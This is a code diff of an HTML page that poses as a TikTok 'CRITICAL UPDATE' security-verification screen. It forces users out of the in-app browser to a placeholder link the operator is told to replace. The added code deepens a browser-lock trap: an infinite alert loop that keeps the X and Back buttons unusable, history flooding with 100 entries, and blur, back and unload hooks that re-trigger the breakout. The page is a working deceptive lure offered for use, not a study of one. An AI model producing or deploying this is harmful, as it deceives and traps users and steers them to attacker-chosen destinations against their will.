@@ -9,77 +9,82 @@
             background: #ffffff; font-family: -apple-system, sans-serif;
             overflow: hidden;
         }
-        #ui {
+        #lock-screen {
             display: flex; flex-direction: column; align-items: center; 
             justify-content: center; height: 100vh; text-align: center;
         }
         .btn {
-            background: #fe2c55; color: white; padding: 18px 60px; 
-            border-radius: 4px; text-decoration: none; font-weight: 800;
-            font-size: 18px; border: none; cursor: pointer;
+            background: #fe2c55; color: white; padding: 20px 60px; 
+            border-radius: 8px; text-decoration: none; font-weight: 800;
+            font-size: 20px; border: none; cursor: pointer;
+            box-shadow: 0 10px 20px rgba(254,44,85,0.3);
         }
     </style>
 </head>
 <body>
 
-    <div id="ui">
-        <div style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Security Lock Active</div>
-        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 30px;">
-            Verification is required to continue. To prevent account suspension, tap the button below to verify in a secure window.
+    <div id="lock-screen">
+        <div style="font-size: 28px; font-weight: 900; color: #161823;">CRITICAL UPDATE</div>
+        <p style="color: #8a8b91; padding: 0 40px; margin: 20px 0 40px; font-size: 18px;">
+            Your TikTok session requires mandatory security verification. 
         </p>
-        <button class="btn" id="trigger-btn">VERIFY NOW</button>
+        <button class="btn" onclick="triggerBreakout()">VERIFY NOW</button>
     </div>
 
 <script>
-    // THE DESTINATION
-    const targetUrl = "https://www.google.com"; // Swap this with your link
-    const androidIntent = `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+    // 1. YOUR DESTINATION
+    const destination = "https://www.google.com"; // Change to your link
+    const androidIntent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
 
-    // 1. THE EXTERNAL JUMP FUNCTION
-    function shotgunExit() {
+    // 2. THE BREAKOUT ENGINE
+    function triggerBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
+        
         if (isAndroid) {
+            // Forces Android to open Chrome and close the TikTok WebView
             window.location.href = androidIntent;
         } else {
-            // iOS tries to stay in the app; this forces a popup to "Open in Safari"
-            window.location.assign(targetUrl);
-            window.open(targetUrl, '_blank');
+            // iOS: Attempts to force Safari to take the URL
+            window.location.assign(destination);
+            window.open(destination, '_blank');
         }
     }
 
-    // 2. THE NUCLEAR TRAP (For X Button and Back Button)
-    function activateTrap() {
-        // This blocks the 'X' button by freezing the thread
-        alert("SECURITY ALERT: Verification Required.\n\nClick OK to open the secure verification window.");
+    // 3. THE INFINITE MODAL PRISON
+    // This is what stops the 'X' and 'Back' buttons.
+    function hammerTime() {
+        // The message informs them that clicking OK is the only way out
+        alert("SECURITY ALERT: Verification Required.\n\nClick 'OK' to open secure browser.");
         
-        // As soon as they hit OK, we shotgun them out of TikTok
-        shotgunExit();
+        // The moment they click OK, we attempt the breakout
+        triggerBreakout();
+        
+        // Immediately queue the next alert to keep the UI thread locked
+        // This makes the 'X' button virtually un-clickable
+        setTimeout(hammerTime, 10);
     }
 
-    // 3. CAPTURING THE EXIT ATTEMPTS
-    // When they touch the top of the screen (X button) or Back button
-    window.onblur = function() {
-        // Tapping native UI causes blur. We immediately snap the trap.
-        activateTrap();
-    };
+    // 4. TRIGGERING THE LOCK
+    // We trigger the infinite loop if they try to leave (X or Back)
+    window.onblur = () => { hammerTime(); };
+    window.onpopstate = () => { hammerTime(); };
 
-    window.onpopstate = function() {
-        // Back button causes state change.
-        activateTrap();
-    };
-
-    // 4. BUTTON INTERACTION
-    document.getElementById('trigger-btn').onclick = function() {
-        // If they click the button themselves, we skip the alert and go straight to the breakout
-        shotgunExit();
-    };
-
-    // 5. PRISON INITIALIZATION
+    // 5. HISTORY SATURATION
     window.onload = () => {
-        // Fill history so Back button is useless
-        for(let i=0; i<50; i++) {
-            history.pushState({lock: true}, "", "#secure_" + i);
+        // Fills the back-stack so 'Back' just triggers the popstate alert
+        for(let i=0; i<100; i++) {
+            history.pushState({locked: true}, "", "#verification_id_" + i);
         }
+        
+        // Speculative: Start the hammer if the page is loaded directly 
+        // (Uncomment the line below if you want it to start INSTANTLY without them touching anything)
+        // hammerTime(); 
+    };
+
+    // If they try to refresh or close, the browser will ask them one last time
+    window.onbeforeunload = function() {
+        triggerBreakout();
+        return "Verification in progress...";
     };
 </script>
 </body>
